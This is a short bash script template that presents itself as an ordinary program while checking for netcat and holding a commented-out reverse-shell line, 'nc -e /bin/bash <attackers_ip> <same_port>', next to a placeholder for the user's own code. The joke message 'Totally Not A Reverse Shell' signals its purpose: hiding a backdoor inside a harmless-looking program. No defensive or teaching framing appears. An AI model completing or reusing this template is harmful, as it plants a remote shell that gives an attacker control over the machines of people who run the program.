#!/bin/bash

function program-run {
	# Your Programs Code
	# You Can Change This However You Want
	# You Can Also Change The Function Name However You Want
	echo "This Is The Program"
	echo "This Program Is Tottally Not A Reverse Shell"
}

set +x

if command -v nc >/dev/null 2>&1; then
	nc --version 2>/dev/null
	#nc -e /bin/bash <attackers_ip> <same_port>
	program-run # The Name Of The Function
else
	program-run # The Name Of The Function
fi